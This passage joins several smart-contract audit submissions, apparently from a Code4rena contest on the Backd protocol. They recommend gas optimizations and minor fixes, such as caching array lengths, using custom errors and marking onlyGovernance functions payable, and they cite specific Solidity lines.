  require(gauges[IStakerVault(stakerVault).getLpGauge()], Error.GAUGE_DOES_NOT_EXIST);  244:          require(IStakerVault(stakerVault).getLpGauge() != address(0), Error.ADDRESS_NOT_FOUND);  265:          require(length == weights.length, "Invalid length of arguments");  270:              require(IStakerVault(stakerVault).getLpGauge() != address(0), Error.ADDRESS_NOT_FOUND);  295:              require(IStakerVault(stakerVault).getLpGauge() != address(0), Error.ADDRESS_NOT_FOUND);  315:          require(_ammGauges.contains(token), "amm gauge not found");  365:          require(length == weights.length, "Invalid length of arguments");  367:              require(_ammGauges.contains(tokens[i]), "amm gauge not found");  424:          require(!exists || keeperGauge != _keeperGauge, Error.INVALID_ARGUMENT);  452:          require(IAmmGauge(_ammGauge).isAmmToken(token), Error.ADDRESS_NOT_WHITELISTED);  484:          require(addressProvider.isStakerVault(msg.sender, lpToken), Error.UNAUTHORIZED_ACCESS);  486:          require(lpGauge != address(0), Error.GAUGE_DOES_NOT_EXIST);  621           require( 622               address(addressProvider.safeGetPoolForToken(lpToken)) != address(0), 623               Error.ADDRESS_NOT_FOUND 624:          ); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L48  ```solidity File: protocol/contracts/tokenomics/VestedEscrowRevocable.sol  52:           require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS);  53:           require(revokedTime[_recipient] == 0, "Recipient already revoked");  54:           require(_recipient != treasury, "Treasury cannot be revoked!"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L52  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  50:           require(msg.sender == address(controller.inflationManager()), Error.UNAUTHORIZED_ACCESS);  57            require( 58                msg.sender == beneficiary || _roleManager().hasRole(Roles.GAUGE_ZAP, msg.sender), 59                Error.UNAUTHORIZED_ACCESS 60:           );  104:          require(amount > 0, Error.INVALID_AMOUNT);  125:          require(amount > 0, Error.INVALID_AMOUNT);  126:          require(balances[msg.sender] >= amount, Error.INSUFFICIENT_BALANCE); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L50  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  57:           require(starttime_ >= block.timestamp, "start must be future");  58:           require(endtime_ > starttime_, "end must be greater");  69:           require(_admin != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  70:           require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS);  75:           require(_fundadmin != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  76:           require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS);  81:           require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS);  82:           require(!initializedSupply, "Supply already initialized once");  84:           require(unallocatedSupply > 0, "No reward tokens in contract");  90:           require(msg.sender == fundAdmin || msg.sender == admin, Error.UNAUTHORIZED_ACCESS);  91:           require(initializedSupply, "Supply must be initialized"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L57  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  40:           require(msg.sender == address(controller.inflationManager()), Error.UNAUTHORIZED_ACCESS);  78            require( 79                IController(controller).addressProvider().isWhiteListedFeeHandler(msg.sender), 80                Error.ADDRESS_NOT_WHITELISTED 81:           );  82:           require(!killed, Error.CONTRACT_PAUSED);  126           require( 127               msg.sender == beneficiary || _roleManager().hasRole(Roles.GAUGE_ZAP, msg.sender), 128               Error.UNAUTHORIZED_ACCESS 129:          );  140:          require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L40  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol  49:           require(tokens_.length != 0, "No tokens to burn");  75:           require(burningEth_ || msg.value == 0, Error.INVALID_VALUE); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L49  ```solidity File: protocol/contracts/tokenomics/LpGauge.sol  31:           require(_stakerVault != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  35:           require(address(_inflationManager) != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  53            require( 54                msg.sender == beneficiary || _roleManager().hasRole(Roles.GAUGE_ZAP, msg.sender), 55                Error.UNAUTHORIZED_ACCESS 56:           ); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L31  ```solidity File: protocol/contracts/tokenomics/BkdToken.sol  31:           require(msg.sender == minter, Error.UNAUTHORIZED_ACCESS); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/BkdToken.sol#L31  ```solidity File: protocol/contracts/access/RoleManager.sol  28:           require(hasRole(Roles.GOVERNANCE, msg.sender), Error.UNAUTHORIZED_ACCESS);  46:           require(getRoleMemberCount(Roles.GOVERNANCE) > 1, Error.CANNOT_REVOKE_ROLE);  112:          require(role != Roles.GOVERNANCE, Error.CANNOT_REVOKE_ROLE);  113:          require(hasRole(role, account), Error.INVALID_ARGUMENT); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L28  ### 21. Functions guaranteed to revert when called by normal users can be marked `payable` If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are  `CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost  *There are 53 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  75:       function initializeLpGauge(address _lpGauge) external override onlyGovernance returns (bool) {  82:       function prepareLpGauge(address _lpGauge) external override onlyGovernance returns (bool) {  87:       function executeLpGauge() external override onlyGovernance returns (bool) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L75  ```solidity File: protocol/contracts/Controller.sol  33:       function setInflationManager(address _inflationManager) external onlyGovernance {  39        function addStakerVault(address stakerVault) 40            external 41            override 42            onlyRoles2(Roles.GOVERNANCE, Roles.POOL_FACTORY) 43:           returns (bool)  62:       function removePool(address pool) external override onlyGovernance returns (bool) {  81:       function prepareKeeperRequiredStakedBKD(uint256 amount) external override onlyGovernance {  89:       function resetKeeperRequiredStakedBKD() external override onlyGovernance { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L33  ```solidity File: protocol/contracts/BkdLocker.sol  53        function initialize( 54            uint256 startBoost, 55            uint256 maxBoost, 56            uint256 increasePeriod, 57            uint256 withdrawDelay 58:       ) external override onlyGovernance {  70:       function migrate(address newRewardToken) external override onlyGovernance { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L53-L58  ```solidity File: protocol/contracts/AddressProvider.sol  63:       function addFeeHandler(address feeHandler) external override onlyGovernance returns (bool) {  70:       function removeFeeHandler(address feeHandler) external override onlyGovernance returns (bool) {  81:       function addAction(address action) external override onlyGovernance returns (bool) {  93        function addPool(address pool) 94            external 95            override 96:           onlyRoles2(Roles.POOL_FACTORY, Roles.GOVERNANCE)  117:      function removePool(address pool) external override onlyRole(Roles.CONTROLLER) returns (bool) {  158       function updateVault(address previousVault, address newVault) 159           external 160           override 161:          onlyRole(Roles.POOL)  212       function initializeAddress( 213           bytes32 key, 214           address initialAddress, 215           bool freezable 216:      ) public override onlyGovernance {  226       function initializeAndFreezeAddress(bytes32 key, address initialAddress) 227           external 228           override 229:          onlyGovernance  239:      function freezeAddress(bytes32 key) external override onlyGovernance {  253       function prepareAddress(bytes32 key, address newAddress) 254           external 255           override 256           onlyGovernance 257:          returns (bool)  278:      function resetAddress(bytes32 key) external override onlyGovernance returns (bool) {  288       function addStakerVault(address stakerVault) 289           external 290           override 291           onlyRole(Roles.CONTROLLER) 292:          returns (bool) ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L63  ```solidity File: protocol/contracts/tokenomics/Minter.sol  99:       function setToken(address _token) external override onlyGovernance {  104:      function startInflation() external override onlyGovernance {  144       function mintNonInflationTokens(address beneficiary, uint256 amount) 145           external 146           override 147           onlyGovernance 148:          returns (bool) ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L99  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  58:       function setMinter(address _minter) external override onlyGovernance returns (bool) {  70:       function advanceKeeperGaugeEpoch(address pool) external override onlyGovernance returns (bool) {  80:       function mintRewards(address beneficiary, uint256 amount) external override onlyGauge {  89        function deactivateWeightBasedKeeperDistribution() 90            external 91            override 92            onlyGovernance 93:           returns (bool)  133       function prepareKeeperPoolWeight(address pool, uint256 newPoolWeight) 134           external 135           override 136           onlyGovernance 137:          returns (bool)  164       function batchPrepareKeeperPoolWeights(address[] calldata pools, uint256[] calldata weights) 165           external 166           override 167           onlyGovernance 168:          returns (bool)  181:      function whitelistGauge(address gauge) external override onlyRole(Roles.CONTROLLER) {  190       function batchExecuteKeeperPoolWeights(address[] calldata pools) 191           external 192           override 193           onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER) 194:          returns (bool)  205       function removeStakerVaultFromInflation(address stakerVault, address lpToken) 206           external 207           override 208:          onlyRole(Roles.CONTROLLER)  221       function prepareLpPoolWeight(address lpToken, uint256 newPoolWeight) 222           external 223           override 224           onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER) 225:          returns (bool)  258       function batchPrepareLpPoolWeights(address[] calldata lpTokens, uint256[] calldata weights) 259           external 260           override 261           onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER) 262:          returns (bool)  284       function batchExecuteLpPoolWeights(address[] calldata lpTokens) 285           external 286           override 287           onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER) 288:          returns (bool)  309       function prepareAmmTokenWeight(address token, uint256 newTokenWeight) 310           external 311           override 312           onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER) 313:          returns (bool)  339       function addStrategyToDepositStakerVault(address depositStakerVault, address strategyPool) 340           external 341           override 342           onlyGovernance 343:          returns (bool)  357       function batchPrepareAmmTokenWeights(address[] calldata tokens, uint256[] calldata weights) 358           external 359           override 360           onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER) 361:          returns (bool)  380       function batchExecuteAmmTokenWeights(address[] calldata tokens) 381           external 382           override 383           onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER) 384:          returns (bool)  405       function setKeeperGauge(address pool, address _keeperGauge) 406           external 407           override 408           onlyGovernance 409:          returns (bool)  435:      function removeKeeperGauge(address pool) external onlyGovernance returns (bool) {  446       function setAmmGauge(address token, address _ammGauge) 447           external 448           override 449           onlyGovernance 450:          returns (bool)  469:      function removeAmmGauge(address token) external override onlyGovernance returns (bool) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L58  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  57:       function kill() external override onlyInflationManager returns (bool) {  96:       function advanceEpoch() external virtual override onlyInflationManager returns (bool) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L57  ```solidity File: protocol/contracts/access/RoleManager.sol  37:       function grantRole(bytes32 role, address account) external override onlyGovernance {  41:       function addGovernor(address newGovernor) external override onlyGovernance {  45:       function renounceGovernance() external override onlyGovernance {  50:       function addGaugeZap(address zap) external override onlyGovernance {  54:       function removeGaugeZap(address zap) external override onlyGovernance {  111:      function revokeRole(bytes32 role, address account) public onlyGovernance { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L37  
1.  Title: Caching `.length` for loop can save gas  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/access/RoleManager.sol#L82 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L39  Recommended Mitigation Steps: Change to: ```  uint256 Length = roles.length;  for (uint256 i; i < Length; i = i.uncheckedInc()) { ```  ========================================================================  2. Title: Using != is more gas efficient  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L91 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L254  Recommended Mitigation Steps: Change to `!=` ```   require(amount != 0, Error.INVALID_AMOUNT); ```  ========================================================================  3. Title: Using delete statement to empty `curRewardTokenData.userShares` can save gas  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L215 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/utils/Preparable.sol#L87-L88  Recommended Mitigation Steps: ```  delete curRewardTokenData.userShares[msg.sender]; ```  ========================================================================  4. Title: Gas improvement on returning `totalEthRequired` value  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol#L121-L130  Recommended Mitigation Steps: by set `totalEthRequired` in returns and delete L#123 can save gas ``` function getTotalEthRequiredForGas(address payer) external view override returns (uint256 totalEthRequired) { //@audit-info: set here         // solhint-disable-previous-line ordering  //@audit-info: remove this line         address[] memory actions = addressProvider.allActions();         uint256 numActions = actions.length;         for (uint256 i = 0; i < numActions; i++) {             totalEthRequired += IAction(actions[i]).getEthRequiredForGas(payer);         }  return totalEthRequired;     } ```  ========================================================================  5. Title: Using unchecked to calculate  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L124  Recommended Mitigation Steps: `balances[msg.sender]` value was checked that it >= than `amount` so using unchecked can save gas: ``` unchecked{  balances[msg.sender] -= amount; } ```  ========================================================================  6. Title: Unnecessary MSTORE `timeElapsed`  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L144-L149  Recommended Mitigation Steps: By passing `block.timestamp - uint256(ammLastUpdated)` directly to L#148 without storing it to `timeElapsed` can save gas without damaging readability of the code  ```  ammStakedIntegral += (currentRate * (block.timestamp - uint256(ammLastUpdated)).scaledDiv(totalStaked); ```  ========================================================================  7. Title: Unnecessary MSTORE  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L138-L144  Recommended Mitigation Steps: instead of caching `length` to `i`. use it directly can save gas delete L#138 and replace `i` with `length  ========================================================================  8. Title: Use `allowance_` directly to substract  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L387  Recommended Mitigation Steps: ```  _allowances[src][msg.sender] = allowance_ - unstaked; ```  ========================================================================  9. Title: Unnecessary `bool` var set  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L412  Recommended Mitigation Steps: the default value of `bool` is `false`  ========================================================================  10. Title: Using `>` instead `>=` can save gas  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L57 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/utils/Preparable.sol#L110  Recommended Mitigation Steps: 1 second difference can be ignored to validate. using `>` operator can save gas ```  require(starttime_ > block.timestamp, "start must be future"); ```  ========================================================================  11. Title: Use custom errors rather than revert()/require() strings to save deployment gas  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L53-L54  reference: https://blog.soliditylang.org/2021/04/21/custom-errors/  ========================================================================  13. Title: Using `+=` to increase value  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L145  Recommended Mitigation Steps: Change to: ```  totalClaimed[msg.sender] += claimable; ```  ========================================================================  14 Title: Unnecessary MSTORE  Proof of Concept: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L155-L156  Recommended Mitigation Steps: instead of caching to `elapsed`. calculate directly can save gas delete L#155  ```  return Math.min((locked * (_time - startTime)) / totalTime, locked); ```  ========================================================================
## Don't use deprecated library functions  Information : [L005 - Do not use Deprecated Library Functions](https://github.com/byterocket/c4-common-issues/blob/main/2-Low-Risk.md#l005---do-not-use-deprecated-library-functions) [SafeERC20.sol - safeApprove](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/65b45726b34dafe8fc3ef78c3d4b7b3f404f61ad/contracts/token/ERC20/utils/SafeERC20.sol#L39)  ### Instances include : ``` contracts/RewardHandler.sol:52:        IERC20(targetLpToken).safeApprove(address(bkdLocker), burnedAmount); contracts/RewardHandler.sol:64:        IERC20(token).safeApprove(spender, type(uint256).max); contracts/tokenomics/FeeBurner.sol:118:        IERC20(token_).safeApprove(spender_, type(uint256).max); contracts/zaps/PoolMigrationZap.sol:27:            IERC20(underlying_).safeApprove(address(newPool_), type(uint256).max); ```  ### Recommendation Usage of deprecated library functions, for instance `safeApprove` from OpenZeppelin's `SafeERC20` library is discouraged, it is recommended to use `safeIncreaseAllowance` and `safeDecreaseAllowance` instead.  --- ## Too many digits Information : [Too many digits](https://github.com/crytic/slither/wiki/Detector-Documentation#too-many-digits)   ### Instances include : ``` contracts/utils/CvxMintAmount.sol:10:    uint256 private constant _CLIFF_SIZE = 100000 * 1e18; //new cliff every 100,000 tokens contracts/utils/CvxMintAmount.sol:12:    uint256 private constant _MAX_SUPPLY = 100000000 * 1e18; //100 mil max supply ```  ### Recommendation Use the scientific notation  --- ## Block timestamp Information : [Block timestamp](https://github.com/crytic/slither/wiki/Detector-Documentation#block-timestamp)  ### Instances include : ``` contracts/utils/Preparable.sol:110:        require(block.timestamp >= deadline, Error.DEADLINE_NOT_REACHED); contracts/tokenomics/Minter.sol:190:        if (block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD) { contracts/BkdLocker.sol:141:            if (stashedWithdraws[i].releaseTime <= block.timestamp) { ``` ### Recommendation Avoid relying on `block.timestamp`.  --- ## Typos  ### Instances include: `invlude`, `successfull` ``` contracts/BkdLocker.sol:     * @dev This does not invlude the gov. tokens queued for withdrawal. contracts/tokenomics/FeeBurner.sol:    event Burned(address targetLpToken, uint256 amountBurned); // Emmited after a successfull burn to target lp token ```
# Gas Optimizations Report  ## For-Loops: Cache array length outside of loops Reading an array length at each iteration of the loop takes 6 gas (3 for `mload` and 3 to place `memory_offset`) in the stack.  Caching the array length in the stack saves around 3 gas per iteration.   For example: ```js for (uint256 i; i < arr.length; ++i) {} ``` can be changed to: ```js uint256 len = arr.length; for (uint256 i; i < len; ++i) {} ```  Consider making the following change to these lines:   ```js protocol/contracts/RewardHandler.sol:   42:        for (uint256 i; i < pools.length; i = i.uncheckedInc()) {  protocol/contracts/StakerVault.sol:  259:        for (uint256 i; i < actions.length; i = i.uncheckedInc()) {  protocol/contracts/tokenomics/VestedEscrow.sol:   94:        for (uint256 i; i < amounts.length; i = i.uncheckedInc()) {  protocol/contracts/tokenomics/InflationManager.sol:  116:        for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) {  protocol/contracts/tokenomics/FeeBurner.sol:   56:        for (uint256 i; i < tokens_.length; i = i.uncheckedInc()) {  protocol/contracts/zaps/PoolMigrationZap.sol:   22:        for (uint256 i; i < newPools_.length; ++i) {   39:        for (uint256 i; i < oldPoolAddresses_.length; ) {  protocol/contracts/access/RoleManager.sol:   82:        for (uint256 i; i < roles.length; i = i.uncheckedInc()) { ```  ## For-Loops: Index increments can be left unchecked From Solidity v0.8 onwards, all arithmetic operations come with implicit overflow and underflow checks.   In for-loops, as it is impossible for the index to overflow, it can be left unchecked to save gas every iteration.   For example, the code below: ```js for (uint256 i; i < numIterations; ++i) {       // ...   }   ``` can be changed to: ```js for (uint256 i; i < numIterations;) {       // ...       unchecked { ++i; }   }   ```  Consider making the following change to these lines:   ```js protocol/contracts/zaps/PoolMigrationZap.sol:   22:        for (uint256 i; i < newPools_.length; ++i) { ```  ## Arithmetics: `++i` costs less gas compared to `i++` or `i += 1` `++i` costs less gas compared to `i++` or `i += 1` for unsigned integers, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  `i++` increments `i` and returns the initial value of `i`. Which means: ```js uint i = 1;   i++; // == 1 but i == 2   ``` But `++i` returns the actual incremented value: ```js uint i = 1;   ++i; // == 2 and i == 2 too, so no need for a temporary variable   ```  In the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`, thus it costs more gas.  The same logic applies for `--i` and `i--`.  Consider using `++i` instead of `i++` or `i += 1` in the following instances:   ```js protocol/contracts/tokenomics/KeeperGauge.sol:   59:        epoch++;   98:        epoch++; ```  ## Arithmetics: Use `!= 0` instead of `> 0` for unsigned integers `uint` will never go below 0. Thus, `> 0` is gas inefficient in comparisons as checking if `!= 0` is sufficient and costs less gas.  Consider changing `> 0` to `!= 0` in these lines:   ```js protocol/contracts/BkdLocker.sol:   91:        require(amount > 0, Error.INVALID_AMOUNT);   92:        require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);  137:        require(length > 0, "No entries");  139:        while (i > 0) {  254:        if (userBalance > 0) {  301:        if (userBalance > 0) {  protocol/contracts/RewardHandler.sol:   63:        if (IERC20(token).allowance(address(this), spender) > 0) return;  protocol/contracts/tokenomics/AmmGauge.sol:   88:        if (!killed && totalStaked > 0) {  104:        require(amount > 0, Error.INVALID_AMOUNT);  125:        require(amount > 0, Error.INVALID_AMOUNT);  147:        if (totalStaked > 0) {  protocol/contracts/tokenomics/AmmConvexGauge.sol:  107:        if (!killed && totalStaked > 0) {  129:        if (!killed && totalStaked > 0) {  158:        require(amount > 0, Error.INVALID_AMOUNT);  171:        require(amount > 0, Error.INVALID_AMOUNT);  197:        if (totalStaked > 0) {  protocol/contracts/tokenomics/VestedEscrow.sol:   84:        require(unallocatedSupply > 0, "No reward tokens in contract");  protocol/contracts/tokenomics/InflationManager.sol:  575:        totalKeeperPoolWeight = totalKeeperPoolWeight > 0 ? totalKeeperPoolWeight : 0;  589:        totalLpPoolWeight = totalLpPoolWeight > 0 ? totalLpPoolWeight : 0;  602:        totalAmmTokenWeight = totalAmmTokenWeight > 0 ? totalAmmTokenWeight : 0;  protocol/contracts/tokenomics/LpGauge.sol:   68:        if (poolTotalStaked > 0) {  114:        if (poolTotalStaked > 0) {  protocol/contracts/tokenomics/FeeBurner.sol:  117:        if (IERC20(token_).allowance(address(this), spender_) > 0) return;  protocol/contracts/tokenomics/KeeperGauge.sol:  140:        require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); ```  ## Errors: Use custom errors instead of revert strings Since Solidity v0.8.4, custom errors should be used instead of revert strings due to: * Cheaper deployment cost * Lower runtime cost upon revert  Taken from [Custom Errors in Solidity](https://blog.soliditylang.org/2021/04/21/custom-errors/): > Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert("Insufficient funds.");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors can be defined using of the `error` statement, both inside or outside of contracts.  Instances where custom errors can be used instead:   ```js protocol/contracts/BkdLocker.sol:  137:        require(length > 0, "No entries");  protocol/contracts/tokenomics/Minter.sol:  100:        require(address(token) == address(0), "Token already set!");  105:        require(lastEvent == 0, "Inflation has already started.");  220:        require(newTotalMintedToNow <= totalAvailableToNow, "Mintable amount exceeded");  protocol/contracts/tokenomics/VestedEscrow.sol:   57:        require(starttime_ >= block.timestamp, "start must be future");   58:        require(endtime_ > starttime_, "end must be greater");   82:        require(!initializedSupply, "Supply already initialized once");   84:        require(unallocatedSupply > 0, "No reward tokens in contract");   91:        require(initializedSupply, "Supply must be initialized");  protocol/contracts/tokenomics/InflationManager.sol:   95:        require(!weightBasedKeeperDistributionDeactivated, "Weight-based dist. deactivated.");  265:        require(length == weights.length, "Invalid length of arguments");  315:        require(_ammGauges.contains(token), "amm gauge not found");  365:        require(length == weights.length, "Invalid length of arguments");  367:        require(_ammGauges.contains(tokens[i]), "amm gauge not found");  protocol/contracts/tokenomics/VestedEscrowRevocable.sol:   53:        require(revokedTime[_recipient] == 0, "Recipient already revoked");   54:        require(_recipient != treasury, "Treasury cannot be revoked!");  protocol/contracts/tokenomics/FeeBurner.sol:   49:        require(tokens_.length != 0, "No tokens to burn");  protocol/contracts/zaps/PoolMigrationZap.sol:   56:        require(lpTokenAmount_ != 0, "No LP Tokens");   57:        require(oldPool_.getWithdrawalFee(msg.sender, lpTokenAmount_) == 0, "withdrawal fee not 0"); ```  ## Unnecessary initialization of variables with default values Uninitialized variables are assigned with a default value depending on its type: * `uint`: `0` * `bool`: `false` * `address`: `address(0)`  Thus, explicitly initializing a variable with its default value costs unnecesary gas. For example, the following code: ```js bool b = false; address c = address(0); uint256 a = 0; ``` can be changed to: ```js uint256 a; bool b; address c; ```  Consider declaring the following lines without explicitly setting a value:   ```js protocol/contracts/tokenomics/InflationManager.sol:  412:        bool keeperGaugeExists = false; ```  ## Unnecessary definition of variables Some variables are defined even though they are only used once in their respective functions. Not defining these variables can help to reduce gas cost and contract size.  Instances include:   ```js protocol/contracts/BkdLocker.sol:  150:        uint256 newTotal = balances[msg.sender] - totalAvailableToWithdraw;  protocol/contracts/RewardHandler.sol:   40:        uint256 ethBalance = address(this).balance;  protocol/contracts/tokenomics/AmmConvexGauge.sol:  153:        uint256[3] memory allRewards = [bkdRewards, crvRewards, cvxRewards];  protocol/contracts/tokenomics/VestedEscrow.sol:  155:        uint256 elapsed = _time - startTime;  protocol/contracts/tokenomics/KeeperGauge.sol:  112:        uint256 timeElapsed = block.timestamp - uint256(lastUpdated); ```   ## Storage variables should be declared `immutable` when possible If a storage variable is assigned only in the constructor, it should be declared as `immutable`. This would help to reduce gas costs as calls to `immutable` variables are much cheaper than regular state variables, as seen from the [Solidity Docs](https://docs.soliditylang.org/en/v0.8.13/contracts.html#constant-and-immutable-state-variables): > Compared to regular state variables, the gas costs of constant and immutable variables are much lower. Immutable variables are evaluated once at construction time and their value is copied to all the places in the code where they are accessed.  Consider declaring these variables as `immutable`:   ```js protocol/contracts/StakerVault.sol:   48:        address public token;  protocol/contracts/tokenomics/VestedEscrow.sol:   39:        uint256 public totalTime; ```  ## Variables declared as `constant` are expressions, not constants Due to how `constant` variables are implemented (replacements at compile-time), an expression assigned to a `constant` variable is recomputed each time that the variable is used, which wastes some gas.  If the variable was `immutable` instead: the calculation would only be done once at deploy time (in the constructor), and then the result would be saved and read directly at runtime rather than being recalculated.  See: [ethereum/solidity#9232](https://github.com/ethereum/solidity/issues/9232): > Consequences: each usage of a “constant” costs ~100 gas more on each access (it is still a little better than storing the result in storage, but not much). since these are not real constants, they can’t be referenced from a real constant environment (e.g. from assembly, or from another library)  ```js protocol/contracts/tokenomics/FeeBurner.sol:   25:        address private constant _WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);  protocol/contracts/utils/CvxMintAmount.sol:   10:        uint256 private constant _CLIFF_SIZE = 100000 * 1e18;   12:        uint256 private constant _MAX_SUPPLY = 100000000 * 1e18;    13:        IERC20 private constant _CVX_TOKEN =   14:                IERC20(address(0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B)); ```  Change these expressions from `constant` to `immutable` and implement the calculation in the constructor. Alternatively, hardcode these values in the constants and add a comment to say how the value was calculated. 
## Don't explicitly initialize variables with the default value  Uninitialized variables are assigned with the default value of their type, initializing a variable with its default value costs unnecessary gas.  ### Instances include : ``` contracts/tokenomics/InflationManager.sol:412:        bool keeperGaugeExists = false; ```  ### Recommendation It is recommended to initialize variables without assigning them the default value, for example : ``` contracts/tokenomics/InflationManager.sol:412:        bool keeperGaugeExists; ``` ---  ## Cache array length outside of for loop  Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop.  ### Instances include : ``` contracts/RewardHandler.sol:42:        for (uint256 i; i < pools.length; i = i.uncheckedInc()) { contracts/access/RoleManager.sol:82:        for (uint256 i; i < roles.length; i = i.uncheckedInc()) { contracts/StakerVault.sol:259:        for (uint256 i; i < actions.length; i = i.uncheckedInc()) { contracts/tokenomics/VestedEscrow.sol:94:        for (uint256 i; i < amounts.length; i = i.uncheckedInc()) { contracts/tokenomics/InflationManager.sol:116:        for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) { contracts/tokenomics/FeeBurner.sol:56:        for (uint256 i; i < tokens_.length; i = i.uncheckedInc()) { contracts/zaps/PoolMigrationZap.sol:22:        for (uint256 i; i < newPools_.length; ++i) { contracts/zaps/PoolMigrationZap.sol:39:        for (uint256 i; i < 